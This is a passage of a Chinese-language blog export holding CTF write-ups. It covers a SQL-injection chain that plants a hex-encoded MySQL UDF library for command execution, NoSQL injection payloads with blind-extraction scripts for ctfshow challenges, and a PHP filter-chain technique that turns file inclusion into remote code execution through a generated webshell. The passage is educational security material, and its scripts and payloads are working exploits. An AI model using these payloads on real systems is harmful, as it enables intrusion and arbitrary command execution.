00000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400'\ncodes = []\nfor i in range(0, len(code), 128):\n    codes.append(code[i:min(i + 128, len(code))])\n\n# 建临时表\nsql = '''create table temp(data longblob)'''\npayload = '''0';{};-- A'''.format(sql)\nrequests.get(url + payload)\n\n# 清空临时表\nsql = '''delete from temp'''\npayload = '''0';{};-- A'''.format(sql)\nrequests.get(url + payload)\n\n# 插入第一段数据\nsql = '''insert into temp(data) values (0x{})'''.format(codes[0])\npayload = '''0';{};-- A'''.format(sql)\nrequests.get(url + payload)\n\n# 更新连接剩余数据\nfor k in range(1, len(codes)):\n    sql = '''update temp set data = concat(data,0x{})'''.format(codes[k])\n    payload = '''0';{};-- A'''.format(sql)\n    requests.get(url + payload)\n\n# 10.3.18-MariaDB\n# 写入so文件\nsql = '''select data from temp into dumpfile '/usr/lib/mariadb/plugin/udf.so\\''''\npayload = '''0';{};-- A'''.format(sql)\nrequests.get(url + payload)\n\n# 引入自定义函数\nsql = '''create function sys_eval returns string soname 'udf.so\\''''\npayload = '''0';{};-- A'''.format(sql)\nrequests.get(url + payload)\n\n# 命令执行，结果更新到界面\nsql = '''update ctfshow_user set pass=(select sys_eval('cat /flag.her?'))'''\npayload = '''0';{};-- A'''.format(sql)\nrequests.get(url + payload)\n\n# 查看结果\nr = requests.get(url[:-4] + '?page=1&limit=10')\nprint(r.text)\n\n```\n\n## nosql注入\n\n### web249\n\n```\n//无\n$user = $memcache->get($id);\n```\n\n无过滤的nosql，是使用了memcache类中的get方法去返回数据的\n\n![image-20250521174653751](../image/achieve/202411/sql注入--ctfshow/image-20250521174653751.png)\n\n当 `get()` 接收到一个数组时，它会尝试获取数组中所有元素对应的键。\n\n所以这里直接用数组绕过\n\n```\n?id[]=flag\n```\n\n### web250\n\n首先看下查询语句和返回逻辑\n\n```\nsql语句\n\n  $query = new MongoDB\\Driver\\Query($data);\n  $cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();\n返回逻辑\n\n  //无过滤\n  if(count($cursor)>0){\n    $ret['msg']='登陆成功';\n    array_push($ret['data'], $flag);\n  }\n```\n\n这里的用的MongoDB\\Driver\\Manager::executeQuery方法去进行执行数据库查询的\n\n如果返回数据大于0的话就会显示登录成功，但是这里的话我们是不知道具体的数据有哪些的\n\n这里的话可以用操作符去进行重言式注入\n\n在mongodb中，要求的查询语句是json格式，如`{\"username\": \"admin\", \"password\": \"admin\"}`，在php中，json就是数组，也就是`Array('username'=> 'admin', 'password'=> 'admin')`，同时MongoDB要求的json格式中，是可以利用操作符进行条件查询的，例如如这样的json: `{\"username\": \"admin\", \"password\": {\"$regex\": '^abc$'}}`，会匹配密码abc，也就是说，如果键对应的值是一个字符串，那么就相当于条件等于，只不过省去了json，如果键对应的值是json对象，就代表是条件查询\n\n```\n$data = array(\"username\" => \"admin\", \"password\" => array(\"\\$ne\" => 1));测一下\n```\n\n查询我们的username为admin但password不为1的内容\n\n所以我们的payload\n\n注入点在/api/中post传参\n\n```\nusername=admin&password[$ne]=1\n```\n\n通过构造 `password[$ne]=1`，可以绕过对 `password` 字段的精确匹配，只要 `password` 不等于 `1`，查询就会成功。\n\n### web251\n\n也是无过滤，继续上次的payload，但是发现用户为admin的password不是flag，看看非admin用户\n\n```\nusername[$ne]=admin&password[$ne]=1\n```\n\n发现一个flag用户密码为flag\n\n### web252\n\nsql语句变了\n\n```\n //sql\n  db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()\n```\n\n这个的话就是MongoDB的查询文档语句了\n\n用上题的payload发现出来一个admin1\n\n```\nusername[$ne]=1&password[$regex]=ctfshow{\n```\n\n这里的话用regex去匹配密码为`ctfshow{`的结果\n\n还有其他几个payload\n\n```\nusername[$regex]=^[^admin]&password[$ne]=1\n```\n\n### web253\n\n传入\n\n```\nusername[$ne]=1&password[$ne]=1\n```\n\n发现显示查询成功但是并没有回显，只能打盲注了，但是这里不知道username是什么，先爆一下username\n\n```python\nimport requests\nimport string\ntable = string.digits+string.ascii_lowercase+string.ascii_uppercase+'_{}-,'\n\nurl = \"http://3a2976ee-9b69-4dae-a8cb-44a6906cacef.challenge.ctf.show/api/\"\ntarget = \"\"\n\nfor i in range(100):\n    for j in table:\n        temp_target = target + j\n        data = {\n            \"username[$regex]\": f\"^[^admin]{temp_target}.*$\",\n            \"password[$ne]\": 1,\n        }\n        r = requests.post(url, data=data)\n        if r\"\\u767b\\u9646\\u6210\\u529f\" in r.text:\n            target += j\n            print(target)\n//ql_flag\n```\n\n这里的话会查出开头不是admin的其他用户名，然后根据这个用户名爆flag\n\n```python\nimport requests\nimport string\ntable = string.digits+string.ascii_lowercase+string.ascii_uppercase+'_{}-,'\n\nurl = \"http://3a2976ee-9b69-4dae-a8cb-44a6906cacef.challenge.ctf.show/api/\"\ntarget = \"\"\n\nfor i in range(100):\n    for j in table:\n        temp_target = target + j\n        data1 = {\n            \"username[$regex]\": f\"^[^admin]{temp_target}.*$\",\n            \"password[$ne]\": 1,\n        }\n        #r = requests.post(url, data=data1)\n        payload2 = f'^{temp_target}.*$'\n        data2 = {\n            'username[$regex]': '^[^admin]ql_flag',\n            'password[$regex]': payload2\n        }\n        r = requests.post(url, data=data2)\n        if r\"\\u767b\\u9646\\u6210\\u529f\" in r.text:\n            target += j\n            print(target)\n\n```\n\n## 总结\n\n其实这次也算第二次做了，之前只是做了一半，这次重新开始做，但总体的速度还是不错的，整个花了四天左右去做完了，虽然题不多但是含金量真的挺高的，学到了很多注入的方法和绕过手法\n\n特别是感觉到这次做的时候比上次做收获更大，学到了更多的东西，对sql的理解也更透彻了一些\n\n","tags":["SQL注入二篇"],"categories":["ctfshow"]},{"title":"filters-chain实现RCE","url":"/2025/05/19/filters-chain实现RCE/","content":"\n最近做到很多这种类似的题目，无论是pycc的include还是xyctf2024中的include_once，都可以实现一种从文件包含中进行getshell的手法，但自己没学过，做的时候就很崩\n\n参考文章：[PHP filters chain: What is it and how to use it](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it)\n\n[Solving \"includer's revenge\" from hxp ctf 2021 without controlling any files](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)\n\nhttps://bierbaumer.net/security/php-lfi-with-nginx-assistance/\n\n几篇国外的文章，但是写的很详细，就是翻译起来比较 费劲\n\n## 关于PHP过滤器\n\n其实在文件包含中很大多数情况都看得到使用伪协议过滤器去进行文件读取的操作，从filter到data和input，都积累了一定的姿势，但是这些始终都是开胃菜\n\n在大师傅的文章中，是研究了一个Laravel框架的register方法中的require函数，这个我们可以直接本地写一个\n\n```php\n<?php\nclass test{\n    public $code;\n    public function register($code){\n        $this->code = $code;\n        require $code;\n    }\n    public function __destruct(){\n        $this -> register();\n    }\n}\n```\n\n这里暂且不谈如何利用，先把知识点讲清楚\n\n### 什么是php://filter\n\n其实这个之前就接触过很多次了，在文件包含include的时候经常用该封装器去读取文件数据流\n\n![image-20250519124546029](../image/achieve/202411/RCE的bypass/image-20250519124546029.png)\n\n然后我们看看过滤器\n\n可用过滤器列表有四种\n\n- 字符串过滤器\n- 转换过滤器\n- 压缩过滤器\n- 加密过滤器\n\n### 转换过滤器\n\n转换过滤器我们最常用的就是convert.base64-encode 和 convert.base64-decode两种，这两种的作用等同于base64_encode()和base64_decode()函数，都是对数据进行base64的加密和解密，但是这里我们需要另外了解一个过滤器\n\n#### convert.iconv.*\n\n这是一个压缩过滤器，相当于使用iconv()函数处理数据，但是这个过滤器不支持参数，但可使用输入/输出的编码名称，组成过滤器名称，比如 `convert.iconv.<input-encoding>.<output-encoding>` 或 `convert.iconv.<input-encoding>/<output-encoding>` （两种写法的语义都相同）。\n\n![image-20250519125214016](../image/achieve/202411/RCE的bypass/image-20250519125214016.png)\n\niconv函数用于将字符串从一种编码转换为另一种编码\n\n语法\n\n```\niconv(string $from_encoding, string $to_encoding, string $string): string|false\n```\n\n参数\n\n- `from_encoding`\n\n  用于解释的编码`string`。\n\n- `to_encoding`\n\n  结果所需的编码。\n\n- string\n\n要转化的字符串\n\n返回值\n\n返回转换后的字符串，或者如果发生错误返回false。\n\n讲完了iconv过滤器，我们看看另一个有意思的地方\n\n## base64decode的垃圾处理\n\n关于base64，之前仅仅停留在绕过关键字过滤的层面，并为对其进行深入了解\n\n需要记住的是，**base64的有效字符包含大小写字母(a-z,A-Z)，数字(0-9)，两个额外字符(+，/)，另外还有一个填充字符(=)**，那么如果包含其他字符的话，此时base64会怎么处理呢\n\n其实之前我就有了解到，php中base64处理函数处理数据的时候十分灵活，通常会自动对字符串进行一个极佳的处理，例如我们这里尝试一下\n\n![image-20250519130655540](../image/achieve/202411/RCE的bypass/image-20250519130655540.png)\n\n发现一个很好玩的现象，如果我们在需要base64decode的字符前面加上一些非法字符，php并不会进行报错，而是忽略了这些无效的字符，最终解码的内容还是YmFzZTY0\n\n然而这种现象不止表现在字符前，还可以在字符中和字符末尾加上非法字符，这始终不影响我们的解码，这恰恰说明了base64_decode函数在处理字符的时候只会过滤有效的字符\n\n![image-20250519130845327](../image/achieve/202411/RCE的bypass/image-20250519130845327.png)\n\n那换成在filter中的过滤器convert.base64-decode呢？\n\n![image-20250519131302321](../image/achieve/202411/RCE的bypass/image-20250519131302321.png)\n\n结果显而易见，都是一样的\n\n但是即使PHP base64-decode filter和base64_decode函数在行为上非常接近，但它们之间在解释'='字符的方式上还是有区别的。\n\n```\nroot@VM-16-12-ubuntu:/# echo \"YmFzZTY0\" > test.txt\n\nroot@VM-16-12-ubuntu:/# php -r \"echo file_get_contents('php://filter/read=convert.base64-decode/resource=test.txt');\"\nbase64\n\nroot@VM-16-12-ubuntu:/# php -r \"echo base64_decode('YmFzZT==Y0');\"\nbase64\n\nroot@VM-16-12-ubuntu:/# echo \"YmFzZTY0==\" > test1.txt\n\nroot@VM-16-12-ubuntu:/# php -r \"echo file_get_contents('php://filter/read=convert.base64-decode/resource=test1.txt');\"\nPHP Warning:  file_get_contents(): Stream filter (convert.base64-decode): invalid byte sequence in Command line code on line 1\n```\n\n这里可以看到，在面对字符`=`的时候，由于某种未知的原因，base64-decode过滤器与默认的base64_decode PHP函数相比，过滤器不能正确地处理等号，所以需要解决这个问题我们需要做什么呢？\n\n事情又回到`convert.iconv.*`过滤器上，之前我们在了解filter的时候就知道，参数中是可以设置一个或多个过滤器的，那我们是否可以将数据流进行一个编码后再进行base64过滤器的处理呢？\n\n解决方案之一是使用UTF 7编码，它将等号转换为其他字符，而不会干扰base64解码过滤器。\n\n```\nroot@VM-16-12-ubuntu:/# echo \"YmFzZTY0==\" > test1.txt\n\nroot@VM-16-12-ubuntu:/# php -r \"echo file_get_contents('php://filter/read=convert.iconv.UTF8.UTF7/convert.base64-decode/resource=test1.txt');\"\nbase64���\n```\n\nfilter链\n\n```\nphp://filter/read=convert.iconv.UTF8.UTF7/convert.base64-decode/resource=test1.txt\n```\n\n这里的话利用iconv将数据流从UTF8转化成UTF7，然后再进行base6解码，这里的话就会将`=`号进行编码为`+AD0`，然后被base64解码为无效的字符\n\n经过上面的测试，我们可以从垃圾字符中过滤出有效的字符了，然后我们进入一个核心的问题，那就是从编码中过滤出前置字符，此时我们需要深入字符编码RFC，因为一些RFC实际上可以有一种方式去前置字符\n\n## 字符序列标志\n\n\n\n![image-20250519135756083](../image/achieve/202411/RCE的bypass/image-20250519135756083.png)\n\n翻译过来就是\n\n```\n字节顺序标记（BOM）\n   Unicode标准和ISO 10646定义了字符“ZERO WIDTH\n   非中断空间”（0xFEFF），也被非正式地称为“字节\n   订单标记”（缩写为“BOM”）。后一个名字暗示了第二个\n   字符的可能用法，除了作为\n   真正的“零宽度非中断空间”内的文字。这种用法，\n   根据Unicode第2.4节和ISO 10646附录F（资料性）的建议，\n   是将0xFEFF字符前置到Unicode字符流，\n   “签名”;这样的串行化流的接收器然后可以使用\n   初始字符作为流由以下内容组成的提示\n   Unicode字符和作为识别序列化顺序的一种方法。\n   在序列化的UTF-16中，前缀有这样的签名，顺序是\n   big-endian，如果前两个八位字节是0xFE后跟0xFF;如果它们\n   是0xFF后面跟着0xFE，顺序是little-endian。注意\n   0xFFFE不是Unicode字符，正是为了保留\n   0xFEFF作为字节顺序标记的有用性。\n```\n\n这里其实不难看出，将0xFEFF字符前置到Unicode字符流，从而实现一种签名\n\n另外再看看韩文字符\n\n```\nIt is assumed that the starting code of the message is ASCII.  ASCII\n   and Korean characters can be distinguished by use of the shift\n   function.  For example, the code SO will alert us that the upcoming\n   bytes will be a Korean character as defined in KSC 5601.  To return\n   to ASCII the SI code is used.\n\n   Therefore, the escape sequence, shift function and character set used\n   in a message are as follows:\n\n           SO           KSC 5601\n           SI           ASCII\n           ESC $ ) C    Appears once in the beginning of a line\n                            before any appearance of SO characters.\n```\n\n翻译一下啊\n\n```\n假设消息的起始代码是ASCII。  ASCII\n   和韩语字符可以通过使用移位来区分\n   功能  例如，代码SO将提醒我们即将到来的\n   字节将是KSC 5601中定义的韩语字符。  返回\n   ASCII使用SI代码。\n   因此，转义序列，移位函数和字符集使用\n   消息如下：\n           所以           KSC 5601\n           SI           ASCII\n           ESC $）C    在行首出现一次\n                            在任何SO角色出现之前。\n```\n\n通过上面的例子可以看出，这些编码的背后有着一种”特殊的标识“，这些标识出现的时候就意味着后面的字符可能包含若干个该标识对应的编码\n\n例如`ESC $）C`，这是一个特殊的转义序列，用于在消息的开头（或行的开头）明确表示后续的字符可能包含 KSC 5601 编码的韩文字符。\n\n所以这意味着要被视为ISO-2022-KR，消息必须以序列`“ESC $）C”`开始。 \n\n| Encoding identifier | Prepended characters |\n| :------------------ | :------------------- |\n| ISO2022KR           | \\x1b$)C              |\n| UTF16               | \\xff\\xfe             |\n| UTF32               | \\xff\\xfe\\x00\\x00     |\n\n该表概述了ISO/IEC 2022和Unicode编码的特殊前置序列。这些将在不破坏base64字符串完整性的情况下前置字符，使它们在PHP过滤器链中可用。\n\n## 构造字符\n\n例如我们想前置一个字符8可以通过三个步骤实现\n\n我们的目标是从一个表跳转到另一个表以获得特定的字符。为了预先准备一个8，我们将需要iso 8859 -10（涵盖斯堪的纳维亚语言）和UNICODE表。\n\n图片来源https://www.synacktiv.com/sites/default/files/inline-images/prepend_character8.png\n\n![image-20250519141602859](../image/achieve/202411/RCE的bypass/image-20250519141602859.png)\n\n- 将字符串转换为UTF16以前置'\\xff\\xfe'\n- 将创建的字符串转换为latin6，'\\xff'相当于拉丁字符kra` 'k'`\n- 将字符串转换回UTF16，其中字符`k\"`等效于”\\x01\\x38“\n- 最后，打印时将逐个字符解释链，因此“\\x38”变为“8”\n\n用代码去实现\n\n```php\n<?php\n$return = iconv( 'UTF8', 'UTF16', \"START\");\necho(bin2hex($return).\"\\n\");\necho($return.\"\\n\");\n$return2 = iconv( 'LATIN6', 'UTF16', $return);\necho(bin2hex($return2).\"\\n\");\necho($return2.\"\\n\");\n```\n\n然后运行\n\n```php\nroot@VM-16-12-ubuntu:/# php 1.php \nfffe53005400410052005400\n��START\nfffe3801fe005300000054000000410000005200000054000000\n��8�START\n```\n\n可以看到这里成功构造出了8，那么我们就可以尝试构造我们想要的字符，然而结合在文件包含函数的特性，无论什么内容都会当成php代码去执行，这也意味着只要我们构造出了恶意的php代码就会顺利的执行，这也为我们带来了许多方便\n\n这个方法是基于一个脚本上找到的Hacktricks\n\n[LFI2RCE via PHP Filters](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html#lfi2rce-via-php-filters)\n\n这篇文章解释了你可以使用php过滤器来生成任意的内容作为输出。这基本上意味着我们可以为include生成任意php代码，而无需将其写入文件。 基本上，该脚本的目标是在文件的开头生成一个Base64字符串，该字符串将被最终解码，提供将由include解释的所需payload。\n\n这个脚本的原则是什么呢？\n\n1. prepend `\\x1b$)C` to our string as described above\n2. apply some chain of iconv conversions that leaves our initial base64 intact and converts the part we just prepended to some string where the only valid base64 char is the next part of our base64-encoded php code\n3. base64-decode and base64-encode the string which will remove any garbage in between\n4. Go back to 1 if the base64 we want to construct isn't finished yet\n5. base64-decode to get our php code\n\n翻译过来就是\n\n- 如上所述，将\\x1b$）C前置到我们的字符串中\n- 应用一些iconv转换链，使我们最初的base64保持不变，并将我们刚刚添加的部分转换为某个字符串，其中唯一有效的base64字符是我们base64编码的php代码的下一部分\n- base64-decode和base64-encode字符串，这将删除其间的任何垃圾\n- 如果我们要构造的base64尚未完成，则返回1\n- base64-decode获取php代码\n\n## 完整脚本\n\n```php\nimport requests\n\nurl = \"http://localhost/index.php\"\nfile_to_use = \"php://temp\"\ncommand = \"/readflag\"\n\n#<?=`$_GET[0]`;;?>\nbase64_payload = \"PD89YCRfR0VUWzBdYDs7Pz4\"\n\nconversions = {\n    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',\n    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',\n    'C': 'convert.iconv.UTF8.CSISO2022KR',\n    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',\n    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',\n    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',\n    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',\n    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',\n    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',\n    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',\n    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',\n    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',\n    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',\n    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',\n    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',\n    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',\n    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',\n    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'\n}\n\n\n# generate some garbage base64\nfilters = \"convert.iconv.UTF8.CSISO2022KR|\"\nfilters += \"convert.base64-encode|\"\n# make sure to get rid of any equal signs in both the string we just generated and the rest of the file\nfilters += \"convert.iconv.UTF8.UTF7|\"\n\n\nfor c in base64_payload[::-1]:\n        filters += conversions[c] + \"|\"\n        # decode and reencode to get rid of everything that isn't valid base64\n        filters += \"convert.base64-decode|\"\n        filters += \"convert.base64-encode|\"\n        # get rid of equal signs\n        filters += \"convert.iconv.UTF8.UTF7|\"\n\nfilters += \"convert.base64-decode\"\n\nfinal_payload = f\"php://filter/{filters}/resource={file_to_use}\"\n\nr = requests.get(url, params={\n    \"0\": command,\n    \"action\": \"include\",\n    \"file\": final_payload\n})\n\nprint(r.text)\n\n```\n\n前面的脚本仅限于该有效负载所需的base64字符。因此，这位师傅创建了自己的脚本来强制所有base64字符\n\n```php\nconversions = {\n    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',\n    '1': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.OSF1002035D.EUC-KR|convert.iconv.MAC-CYRILLIC.T.61-8BIT|convert.iconv.1046.CSIBM864|convert.iconv.OSF1002035E.UCS-4BE|convert.iconv.EBCDIC-INT1.IBM943',\n    '2': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO6937.OSF1002011C|convert.iconv.CP1146.EUCJP-OPEN|convert.iconv.IBM1157.UTF8',\n    '3': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO8859-7.CSISOLATIN3|convert.iconv.ISO-8859-9.CP905|convert.iconv.IBM1112.CSPC858MULTILINGUAL|convert.iconv.EBCDIC-CP-NL.ISO-10646',\n    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2',\n    '5': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.RUSCII.IBM275|convert.iconv.CSEBCDICFR.CP857|convert.iconv.EBCDIC-CP-WT.ISO88591',\n    '6': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-37.MACUK|convert.iconv.CSIBM297.ISO-IR-203',\n    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',\n    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',\n    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',\n    'a': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSIBM9066.CP1371|convert.iconv.KOI8-RU.OSF00010101|convert.iconv.EBCDIC-CP-FR.ISO-IR-156',\n    'b': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1399.UCS4',\n    'c': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.8859_9.OSF100201F4|convert.iconv.IBM1112.CP1004|convert.iconv.OSF00010007.CP285|convert.iconv.IBM-1141.OSF10020402',\n    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',\n    'e': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO27LATINGREEK1.SHIFT_JISX0213|convert.iconv.IBM1164.UCS-4',\n    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',\n    'g': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022CN.CP855|convert.iconv.CSISO49INIS.IBM1142',\n    'h': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.THAI8.OSF100201B5|convert.iconv.NS_4551-1.CP1160|convert.iconv.CP275.IBM297',\n    'i': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.IBM943|convert.iconv.CUBA.CSIBM1140',\n    'j': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO27LATINGREEK1.UCS-4BE|convert.iconv.IBM857.OSF1002011C',\n    'k': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO88594.CP912|convert.iconv.ISO-IR-121.CP1122|convert.iconv.IBM420.UTF-32LE|convert.iconv.OSF100201B5.IBM-1399',\n    'l': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO90.MACIS|convert.iconv.CSIBM865.10646-1:1993|convert.iconv.ISO_69372.CSEBCDICATDEA',\n    'm': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.CSSHIFTJIS|convert.iconv.NO2.CSIBM1399',\n    'n': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.IBM862|convert.iconv.CP860.IBM-1399',\n    'o': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO8859-6.CP861|convert.iconv.904.UTF-16|convert.iconv.IBM-1122.IBM1390',\n    'p': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1125.IBM1146|convert.iconv.IBM284.ISO_8859-16|convert.iconv.ISO-IR-143.IBM-933',\n    'q': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.NC_NC00-10:81.CSIBM863|convert.iconv.CP297.UTF16BE',\n    'r': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-86.ISO_8859-4:1988|convert.iconv.TURKISH8.CP1149',\n    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',\n    't': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.WINDOWS-1251.CP1364|convert.iconv.IBM880.IBM-1146|convert.iconv.IBM-935.CP037|convert.iconv.IBM500.L3|convert.iconv.CP282.TS-5881',\n    'u': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO_6937:1992.ISO-IR-121|convert.iconv.ISO_8859-7:1987.ANSI_X3.110|convert.iconv.CSIBM1158.UTF16BE',\n    'v': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.HU.ISO_6937:1992|convert.iconv.CSIBM863.IBM284',\n    'w': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO_6937-2:1983.857|convert.iconv.8859_3.EBCDIC-CP-FR',\n    'x': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1254.ISO-IR-226|convert.iconv.CSMACINTOSH.IBM-1149|convert.iconv.EBCDICESA.UCS4|convert.iconv.1026.UTF-32LE',\n    'y': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.EBCDIC-INT1.IBM-1399',\n    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',\n    'A': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-111.IBM1130|convert.iconv.L1.ISO-IR-156',\n    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',\n    'C': 'convert.iconv.UTF8.CSISO2022KR',\n    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',\n    'E': 